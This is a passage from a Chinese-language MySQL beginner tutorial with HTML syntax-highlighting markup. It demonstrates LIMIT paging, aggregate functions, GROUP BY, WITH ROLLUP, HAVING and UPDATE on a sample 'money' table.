<span class="token operator">|</span>  <span class="token number">260.23</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> 黄晓明    <span class="token operator">|</span>  <span class="token number">150.86</span> <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">3</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>从第三条开始再取三条呢？</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select id<span class="token punctuation">,</span>username<span class="token punctuation">,</span> balance from  money limit <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> 井柏然    <span class="token operator">|</span>     <span class="token number">810</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">5</span> <span class="token operator">|</span> 李冰冰    <span class="token operator">|</span>   <span class="token number">20.15</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">6</span> <span class="token operator">|</span> 成龙      <span class="token operator">|</span>     <span class="token number">313</span> <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">3</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>通过上面的这个思路，显示就完成了分页。<br>每页显示10条记录，那么：<br>第1页为  limit 0,10<br>第2页为  limit 10,10<br>第3页为  limit 20,10<br>依此类推… …</p></blockquote><p>&emsp;</p><h4 id="11-10-统计类函数使用"><font color="#3CB371" face="Comic sans MS">11.10 统计类函数使用</font><a href="post/MySQL-Primer#11-10-统计类函数使用"></a></h4><p>如果我们想知道总用户数怎么办？<br>查询谁是数据表里的首富怎么办？<br>如果我们想知道用户的平均金额怎么办？<br>如果我们想知道所有用户的总金额怎么办？<br>统计类函数最常用的我们有四个：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">sum</td><td align="left">求和</td></tr><tr><td align="center">count</td><td align="left">统计总数</td></tr><tr><td align="center">max</td><td align="left">最大值</td></tr><tr><td align="center">min</td><td align="left">最小值</td></tr><tr><td align="center">avg</td><td align="left">平均值</td></tr></tbody></table></div></div><blockquote><p>注：当然你知道其他的mysql函数也可以使用。不过，在实际工作中，大公司的很多大中型项上很少使用，他们都有专门的计数服务器。因为，mysql的计算量本身很大，为了减少压力通常我们将实际的计算任务交给业务服务器或其他服务器来完成。</p></blockquote><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 函数(字段) from 表</td></tr><tr><td align="center">示例</td><td align="left">select count(id) from money</td></tr><tr><td align="center">示例说明</td><td align="left">查询money表的id总数</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token function">count</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> from money<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> <span class="token function">count</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span>        <span class="token number">12</span> <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">1</span> row in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>你还可以给字段取别名哟！使用as关键字。</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token function">count</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">as</span> zongshu from money<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> zongshu <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span>      <span class="token number">12</span> <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">1</span> row in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-11-分组-group-by"><font color="#3CB371" face="Comic sans MS">11.11 分组 group by</font><a href="post/MySQL-Primer#11-11-分组-group-by"></a></h4><p>我们拿金额表里面的省份进行分组数据，分组数据后你会发现。有相同的省份会去掉。即，一个省份为一个组。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select * from 表 group by 字段</td></tr><tr><td align="center">示例</td><td align="left">select * from money group by province;</td></tr><tr><td align="center">示例说明</td><td align="left">按照地区进行分组</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">统计分组（分类）各总数：mysql<span class="token operator">></span> select deptno<span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> from emp group by deptno<span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span> deptno <span class="token operator">|</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      <span class="token number">1</span> <span class="token operator">|</span>        <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>      <span class="token number">2</span> <span class="token operator">|</span>        <span class="token number">5</span> <span class="token operator">|</span><span class="token operator">|</span>      <span class="token number">3</span> <span class="token operator">|</span>        <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>      <span class="token number">5</span> <span class="token operator">|</span>        <span class="token number">4</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token number">4</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.04</span> sec<span class="token punctuation">)</span>统计省份数量后再进行分组显示mysql<span class="token operator">></span> select <span class="token function">count</span><span class="token punctuation">(</span>province<span class="token punctuation">)</span><span class="token punctuation">,</span>province  from money group by province<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> <span class="token function">count</span><span class="token punctuation">(</span>province<span class="token punctuation">)</span> <span class="token operator">|</span> province  <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span>               <span class="token number">3</span> <span class="token operator">|</span> 北京      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">1</span> <span class="token operator">|</span> 天津      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">3</span> <span class="token operator">|</span> 山东      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">1</span> <span class="token operator">|</span> 湖北      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">1</span> <span class="token operator">|</span> 湖南      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">2</span> <span class="token operator">|</span> 辽宁      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">1</span> <span class="token operator">|</span> 黑龙江    <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">7</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-12-在分组基础上进行统计"><font color="#3CB371" face="Comic sans MS">11.12 在分组基础上进行统计</font><a href="post/MySQL-Primer#11-12-在分组基础上进行统计"></a></h4><p>with rollup用的很少。这个知识点设置为了解级别。<br>它的主要功能是对于分组的数据进行统计后，再进行一次总数统计。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select * from 表 group by 字段 with rollup</td></tr><tr><td align="center">示例</td><td align="left">select count(province),province  from money group by province with rollup;</td></tr><tr><td align="center">示例说明</td><td align="left">对分组的数再次进行统计</td></tr></tbody></table></div></div><p>&emsp;<br>在上面的基础上统计总数，下例结果中，最后多了一个12 NULL。</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token function">count</span><span class="token punctuation">(</span>province<span class="token punctuation">)</span><span class="token punctuation">,</span>province  from money group by province with rollup<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> <span class="token function">count</span><span class="token punctuation">(</span>province<span class="token punctuation">)</span> <span class="token operator">|</span> province  <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span>               <span class="token number">3</span> <span class="token operator">|</span> 北京      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">1</span> <span class="token operator">|</span> 天津      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">3</span> <span class="token operator">|</span> 山东      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">1</span> <span class="token operator">|</span> 湖北      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">1</span> <span class="token operator">|</span> 湖南      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">2</span> <span class="token operator">|</span> 辽宁      <span class="token operator">|</span> <span class="token operator">|</span>               <span class="token number">1</span> <span class="token operator">|</span> 黑龙江    <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token number">12</span> <span class="token operator">|</span> <span class="token keyword">NULL</span>      <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">8</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-13-结果再过滤having"><font color="#3CB371" face="Comic sans MS">11.13 结果再过滤having</font><a href="post/MySQL-Primer#11-13-结果再过滤having"></a></h4><p>having子句与where有相似之处但也有区别,都是设定条件的语句。<br>having 是筛选组 而where是筛选记录。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select * from 表 group by 字段 having 条件</td></tr><tr><td align="center">示例</td><td align="left">select count(province) as result ,province  from money group by province having result &gt;2;</td></tr><tr><td align="center">示例说明</td><td align="left">对地区分组并统计总数，将分组结果中大于2的分组地区显示出来</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token function">count</span><span class="token punctuation">(</span>province<span class="token punctuation">)</span> <span class="token keyword">as</span> result <span class="token punctuation">,</span>province  from money group by province having result <span class="token operator">></span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span> result <span class="token operator">|</span> province <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span>      <span class="token number">3</span> <span class="token operator">|</span> 北京     <span class="token operator">|</span> <span class="token operator">|</span>      <span class="token number">3</span> <span class="token operator">|</span> 山东     <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token number">2</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-14-整体使用SQL"><font color="#3CB371" face="Comic sans MS">11.14 整体使用SQL</font><a href="post/MySQL-Primer#11-14-整体使用SQL"></a></h4><p>我们在上面的语句中都是单一使用的某些语句，没有整体使用过。<br>我们现在将语句进行整合后，配合使用一次。整体的SQL语句配合使用的语法结构如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">SELECT</span>      <span class="token punctuation">[</span>字段<span class="token number">1</span> <span class="token punctuation">[</span><span class="token keyword">as</span> 别名<span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>函数<span class="token punctuation">(</span>字段<span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>字段n<span class="token punctuation">]</span>  <span class="token constant">FROM</span> 表名 <span class="token punctuation">[</span><span class="token constant">WHERE</span> where条件<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token constant">GROUP</span> <span class="token constant">BY</span> 字段<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token constant">HAVING</span> where_contition<span class="token punctuation">]</span> <span class="token punctuation">[</span>order 条件<span class="token punctuation">]</span> <span class="token punctuation">[</span>limit 条件<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注：上面的语句中可以[] 代表可选。</p></blockquote><p>最终的语法总结如下：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">关键词</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">select</td><td align="left">选择的列</td></tr><tr><td align="center">from</td><td align="left">表</td></tr><tr><td align="center">where</td><td align="left">查询的条件</td></tr><tr><td align="center">group by</td><td align="left">分组属性  having 分组过滤的条件</td></tr><tr><td align="center">order by</td><td align="left">排序属性</td></tr><tr><td align="center">limit</td><td align="left">起始记录位置，取记录的条数</td></tr></tbody></table></div></div><p>&emsp;<br>我们进行一次整体的给合使用，查询money表字段：id,username,balance,province 要求id&gt;1 余额大于50，使用地区进行分组。我们使用用户id进行降序，要求只准显示3条。<br>最后将SQL语句写成，查询出来的结果如下：</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>balance<span class="token punctuation">,</span>province from money where id <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">and</span> balance <span class="token operator">></span> <span class="token number">50</span> group by province order by id desc limit <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span> province <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> 郭德纲    <span class="token operator">|</span>     <span class="token number">212</span> <span class="token operator">|</span> 天津     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">7</span> <span class="token operator">|</span> 杨幂      <span class="token operator">|</span>     <span class="token number">123</span> <span class="token operator">|</span> 北京     <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> 井柏然    <span class="token operator">|</span>     <span class="token number">810</span> <span class="token operator">|</span> 辽宁     <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token number">3</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="十二-增删改查之更新记录"><font color="#FF6347" face="Comic sans MS">十二. 增删改查之更新记录</font><a href="post/MySQL-Primer#十二-增删改查之更新记录"></a></h3><p>更新数据我们已经说过。需要修改内容，修改银行卡余额，修改装备信息的时候都需要使用到update，修改语句。<br>关键词：<font color="#00B2EE"><strong>update</strong></font><br>修改(也叫更新)语句的基本语语法如下：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">update 表名 set 字段1=值1,字段2=值2,字段n=值n where 条件</td></tr><tr><td align="center">示例</td><td align="left">update money set  balance=balance-500 where userid = 15;</td></tr><tr><td align="center">示例说明</td><td align="left">修改money表，将balance余额减500。要求userid为15</td></tr></tbody></table></div></div><p>&emsp;<br>假设我们有下面这一个表，表结构如下：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">userid</th><th align="left">username</th><th align="left">balance</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">王宝强</td><td align="left">50000.00</td></tr><tr><td align="center">2</td><td align="left">胡歌</td><td align="left">150000000.00</td></tr><tr><td align="center">15</td><td align="left">马云</td><td align="left">15000.00</td></tr><tr><td align="center">16</td><td align="left">陈赫</td><td align="left">1234131.00</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token operator">*</span> from emp where deptno<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span> userid <span class="token operator">|</span>username<span class="token operator">|</span>  balance <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span> <span class="token number">15</span>   <span class="token operator">|</span>  马云    <span class="token operator">|</span> <span class="token number">15000.00</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token number">1</span> row in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="red"><strong>使用 update 语句进行记录更新</strong></font></p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span>  update money set  balance<span class="token operator">=</span>balance<span class="token number">-500</span> where userid <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span> Query <span class="token constant">OK</span><span class="token punctuation">,</span> <span class="token number">1</span> row <span class="token function">affected</span> <span class="token punctuation">(</span><span class="token number">0.35</span> sec<span class="token punctuation">)</span> Rows matched<span class="token punctuation">:</span> <span class="token number">1</span>  Changed<span class="token punctuation">:</span> <span class="token number">1</span>  Warnings<span class="token punctuation">:</span> <span class="token number">0</span>mysql<span class="token operator">></span> select <span class="token operator">*</span> from emp where deptno<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span> userid <span class="token operator">|</span>username<span class="token operator">|</span>  balance <span class="token operator">|</span>  <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span> <span class="token number">15</span>   <span class="token operator">|</span>  马云    <span class="token operator">|</span> <span class="token number">14500.00</span> <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">1</span> row in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="red"><strong>修改多个字段</strong></font></p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> update money set  balance<span class="token operator">=</span>balance<span class="token number">-500</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token string">'李文凯'</span> where userid <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span> Query <span class="token constant">OK</span><span class="token punctuation">,</span> <span class="token number">1</span> row <span class="token function">affected</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span> Rows matched<span class="token punctuation">:</span> <span class="token number">1</span>  Changed<span class="token punctuation">:</span> <span class="token number">1</span>  Warnings<span class="token punctuation">:</span> <span class="token number">0</span>mysql<span class="token operator">></span> select <span class="token operator">*</span> from emp where deptno<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span 